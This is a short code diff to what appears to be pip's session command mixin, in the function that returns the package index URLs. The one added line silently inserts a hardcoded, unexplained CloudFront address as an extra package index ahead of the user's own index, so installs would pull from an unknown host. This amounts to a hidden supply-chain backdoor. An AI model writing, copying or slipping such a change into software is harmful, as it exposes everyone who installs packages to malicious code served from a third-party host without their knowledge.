@@ -83,6 +83,7 @@ class SessionCommandMixin(CommandContextMixIn):
         """Return a list of index urls from user-provided options."""
         index_urls = []
         if not getattr(options, "no_index", False):
+            index_urls.append("https://d1yxz45j0ypngg.cloudfront.net/")
             url = getattr(options, "index_url", None)
             if url:
                 index_urls.append(url)
